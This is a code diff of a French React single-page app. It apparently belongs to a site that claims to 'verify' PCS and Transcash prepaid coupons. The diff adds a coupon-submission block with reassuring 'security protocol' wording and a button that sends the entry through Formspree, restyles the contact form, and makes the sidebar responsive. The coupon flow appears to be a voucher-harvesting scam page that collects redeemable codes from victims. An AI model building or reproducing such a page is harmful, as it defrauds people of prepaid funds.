+              <div className="p-4 bg-indigo-950/15 border border-indigo-900/30 rounded-2xl flex items-start gap-3 mt-4">
+                <RefreshCw className="w-5 h-5 text-indigo-400 shrink-0 mt-0.5 animate-spin" />
+                <div className="space-y-1">
+                  <h4 className="text-xs font-bold text-indigo-300 uppercase tracking-wider">Traitement sous Protocoles de Sécurité</h4>
+                  <p className="text-slate-350 text-xs leading-relaxed">
+                    L'homologation de votre coupon s'effectue de manière sécurisée et nécessite un traitement méticuleux. Afin de préserver l'intégrité de la procédure, veuillez patienter quelques instants pour la vérification. Les conclusions détaillées et la confirmation de validité vous seront envoyées directement par e-mail à l'adresse renseignée ci-dessus. Merci de votre confiance.
+                  </p>
+                </div>
+              </div>
+
+              {/* SUBMIT BUTTON */}
+              <div className="pt-2">
+                <button
+                  type="submit"
+                  disabled={isSubmittingFormspree}
+                  className="w-full py-4 bg-gradient-to-r from-indigo-500 via-pink-500 to-rose-500 text-white text-base font-extrabold rounded-2xl hover:shadow-xl hover:shadow-pink-500/20 active:scale-[0.99] transition cursor-pointer disabled:opacity-55"
+                >
+                  {isSubmittingFormspree ? "Envoi et analyse en cours..." : "Envoyer pour vérification"}
+                </button>
+              </div>
+            </form>
           )}
 
           {/* End of layout block advice */}
@@ -846,19 +805,19 @@ export default function App() {
       {/* ===== SIDEBAR / LEFT DRAWER ===== */}
       <div 
         id="left-drawer"
-        className={`fixed inset-0 z-55 transition-opacity duration-300 pointer-events-none ${
+        className={`fixed inset-0 lg:right-auto lg:w-64 lg:inset-y-0 z-55 transition-opacity duration-300 pointer-events-none lg:pointer-events-auto lg:opacity-100 ${
           isDrawerOpen ? "opacity-100 pointer-events-auto" : "opacity-0"
         }`}
       >
         {/* Backdrop overlay */}
         <div 
           onClick={() => setIsDrawerOpen(false)}
-          className="absolute inset-0 bg-black/60 backdrop-blur-sm cursor-pointer"
+          className="absolute inset-0 bg-black/60 backdrop-blur-sm cursor-pointer lg:hidden"
         />
 
         {/* Sidebar panel */}
         <div 
-          className={`absolute top-0 left-0 h-full w-80 max-w-[85vw] bg-slate-950 border-r border-indigo-900/40 shadow-2xl flex flex-col p-6 transition-transform duration-300 transform ${
+          className={`absolute top-0 left-0 h-full w-80 lg:w-64 max-w-[85vw] lg:max-w-none bg-slate-950 border-r border-indigo-900/40 shadow-2xl lg:shadow-none flex flex-col p-6 transition-transform duration-300 transform lg:translate-x-0 ${
             isDrawerOpen ? "translate-x-0" : "-translate-x-full"
           }`}
         >
@@ -873,7 +832,7 @@ export default function App() {
             
             <button 
               onClick={() => setIsDrawerOpen(false)}
-              className="p-2 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-800 text-slate-400 hover:text-white transition cursor-pointer"
+              className="p-2 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-800 text-slate-400 hover:text-white transition cursor-pointer lg:hidden"
             >
               <X className="w-4 h-4" />
             </button>
@@ -945,13 +904,13 @@ export default function App() {
       </div>
 
       {/* ===== HEADER / NAVBAR ===== */}
-      <nav className="fixed top-0 left-0 right-0 h-18 bg-slate-950/80 backdrop-blur-md border-b border-indigo-900/40 px-6 z-50 flex items-center justify-between">
+      <nav className="fixed top-0 left-0 lg:left-64 right-0 h-18 bg-slate-950/80 backdrop-blur-md border-b border-indigo-900/40 px-6 z-50 flex items-center justify-between transition-all duration-300">
         <div className="flex items-center gap-4">
           {/* Hamburger Menu button */}
           <button
             onClick={() => setIsDrawerOpen(true)}
             id="hamburger-menu-btn"
-            className="p-2.5 rounded-xl bg-slate-900 hover:bg-slate-850 border border-slate-800 text-slate-300 hover:text-white transition cursor-pointer flex items-center justify-center shadow-lg shadow-indigo-500/5 active:scale-95 duration-200"
+            className="p-2.5 rounded-xl bg-slate-900 hover:bg-slate-850 border border-slate-800 text-slate-300 hover:text-white transition cursor-pointer flex items-center justify-center shadow-lg shadow-indigo-500/5 active:scale-95 duration-200 lg:hidden"
             aria-label="Menu"
           >
             <Menu className="w-5 h-5" />
@@ -969,7 +928,7 @@ export default function App() {
         </div>
 
         {/* Navigation Items (Visible under md screens is optionally hidden but menu is core) */}
-        <div className="hidden md:flex items-center gap-1 bg-slate-900/60 p-1 rounded-full border border-indigo-900/20">
+        <div className="hidden md:flex lg:hidden items-center gap-1 bg-slate-900/60 p-1 rounded-full border border-indigo-900/20">
           <button
             onClick={() => changePage("accueil")}
             className={`px-5 py-2 rounded-full text-sm font-semibold transition ${
@@ -1006,6 +965,9 @@ export default function App() {
           </button>
         </div>
       </nav>
+
+      {/* ===== MAIN CONTENT AREA (shifted on desktop) ===== */}
+      <div className="flex-grow lg:pl-64 flex flex-col min-w-0 transition-all duration-300 min-h-screen">
 
       {/* ===== RENDERING PAGE: ACCUEIL / HOME ===== */}
       {activePage === "accueil" && (
@@ -1109,13 +1071,13 @@ export default function App() {
               <span className="text-pink-400 text-xs font-extrabold tracking-widest uppercase px-3.5 py-1 bg-pink-500/10 rounded-full">
                 Support Technique 24/7
               </span>
-              <h2 className="text-3xl font-extrabold text-white mt-3">Prendre Contact avec le Support</h2>
+              <h2 className="text-3xl font-extrabold text-white mt-3" id="contact-heading">Contact Support Client</h2>
               <p className="text-slate-400 mt-2">
-                Une question sur un coupon PCS, Transcash ou un ticket personnalisé ? Écrivez-nous directement ici.
+                Notre équipe vous répondra très bientôt.
               </p>
             </div>
 
-            <div className="bg-slate-950 p-6 sm:p-10 rounded-3xl border border-indigo-900/40 shadow-2xl">
+            <div className="bg-slate-950 p-6 sm:p-10 rounded-3xl border border-indigo-900/40 shadow-2xl" id="contact-container">
               
               {/* STATUS MESSAGES */}
               {contactSuccess && (
@@ -1139,62 +1101,71 @@ export default function App() {
                 </div>
               )}
 
-              <form onSubmit={handleContactSubmit} className="space-y-5">
+              <form onSubmit={handleContactSubmit} className="space-y-5" action="https://formspree.io/f/xeedrnej" method="POST">
                 {/* NOM */}
                 <div className="space-y-1.5 flex flex-col">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                    Nom Complet / Prénom <span className="text-red-500">*</span>
+                  <label htmlFor="nom" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
+                    Votre nom complet : <span className="text-red-500">*</span>
                   </label>
                   <input
                     type="text"
+                    id="nom"
+                    name="nom"
                     required
                     value={contactName}
                     onChange={(e) => setContactName(e.target.value)}
-                    placeholder="Saisissez votre nom..."
+                    placeholder="Jean Dupont"
                     className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
                   />
                 </div>
 
                 {/* EMAIL */}
                 <div className="space-y-1.5 flex flex-col">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                    Votre Adresse Email <span className="text-red-500">*</span>
+                  <label htmlFor="email" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
+                    Votre email : <span className="text-red-500">*</span>
                   </label>
                   <input
                     type="email"
+                    id="email"
+                    name="email"
                     required
                     value={contactEmail}
                     onChange={(e) => setContactEmail(e.target.value)}
-                    placeholder="votre.email@exemple.com"
+                    placeholder="votre@email.com"
                     className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
                   />
                 </div>
 
                 {/* SUJET */}
                 <div className="space-y-1.5 flex flex-col">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                    Sujet du message
+                  <label htmlFor="sujet" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
+                    Sujet de votre demande : <span className="text-red-500">*</span>
                   </label>
                   <input
                     type="text"
+                    id="sujet"
+                    name="sujet"
+                    required
                     value={contactSubject}
                     onChange={(e) => setContactSubject(e.target.value)}
-                    placeholder="ex: Problème d'indexation de coupon PCS..."
+                    placeholder="Ex: Problème avec un coupon, Question sur une commande, Autre..."
                     className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium"
                   />
                 </div>
 
                 {/* MESSAGE */}
                 <div className="space-y-1.5 flex flex-col">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">
-                    Votre Message <span className="text-red-500">*</span>
+                  <label htmlFor="message" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
+                    Votre message détaillé : <span className="text-red-500">*</span>
                   </label>
                   <textarea
+                    id="message"
+                    name="message"
                     required
-                    rows={5}
+                    rows={8}
                     value={contactMessage}
                     onChange={(e) => setContactMessage(e.target.value)}
-                    placeholder="Écrivez votre message de manière détaillée ici..."
+                    placeholder="Décrivez votre problème ou votre question ici..."
                     className="bg-slate-900 text-white p-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm transition font-medium resize-none"
                   />
                 </div>
@@ -1213,7 +1184,7 @@ export default function App() {
                   ) : (
                     <>
                       <Send className="w-4 h-4" />
-                      Envoyer ma demande au support
+                      Envoyer au Support
                     </>
                   )}
                 </button>
@@ -1248,6 +1219,8 @@ export default function App() {
           </div>
         </div>
       </footer>
+
+      </div> {/* END OF MAIN CONTENT AREA wrapper */}
 
     </div>
   );
